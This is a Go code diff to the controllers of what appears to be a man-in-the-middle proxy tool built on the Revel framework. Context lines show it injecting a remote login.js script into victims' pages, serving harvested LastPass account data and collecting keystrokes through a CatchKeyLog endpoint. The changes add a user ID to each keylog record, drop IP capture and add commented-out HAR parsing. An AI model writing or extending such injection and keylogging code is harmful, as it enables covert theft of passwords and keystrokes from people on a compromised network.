@@ -2,6 +2,7 @@ package controllers
 
 import (
 	"github.com/revel/revel"
+	// "github.com/jeffail/gabs"
 	"log"
 	"fmt"
 	"io/ioutil"
@@ -80,6 +81,7 @@ func InitiateProxy() {
 	INJECT_LOGIN_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/login.js\"></script></body>"
 	users = make(map[string]string)
 	// go arpScanner() //start the arpscanner in the background
+	// getRedirectUrls() //temporary
 }
 
 func (c App) FetchAllData() revel.Result {
@@ -327,9 +329,11 @@ func (c App) GetLastpass() revel.Result {
 	return c.RenderJson(lastPassAccounts)
 }
 func (c App) CatchKeyLog() revel.Result {
+	var u string
 	var d string
 	var p string
 	var o string
+	c.Params.Bind(&u, "userid")
 	c.Params.Bind(&d, "data")
 	c.Params.Bind(&p, "page")
 	c.Params.Bind(&o, "object")
@@ -337,12 +341,10 @@ func (c App) CatchKeyLog() revel.Result {
 		var k KeyLog
 		k.Page = p
 		k.Content = d
+		k.UserId = u
 		t := time.Now().Local()
 		k.Timestamp = t.Format("20060102150405")
-		s := strings.Split(c.Request.RemoteAddr, ":")
 		k.DomObject = o
-		ip := s[0]
-		k.IP = ip
 		keylogs = append(keylogs, k)
 		return c.RenderJson("logger updated")
 	}
@@ -371,6 +373,16 @@ func (c App) GetHar() revel.Result {
     if err != nil {
     	return c.RenderJson("The file may not exist...")
     }
+    // log.Println("har: ", string(data))
+
+	// jsonParsed, _ := gabs.ParseJSON(data)
+	// log.Println(jsonParsed)
+	// // S is shorthand for Search
+	// children, _ := jsonParsed.S("entries").Children()
+	// for _, child := range children {
+	//     log.Println(child.Data().(string))
+	// }
+
     return c.RenderJson(string(data))
 }
 func (c App) Pinger() revel.Result {
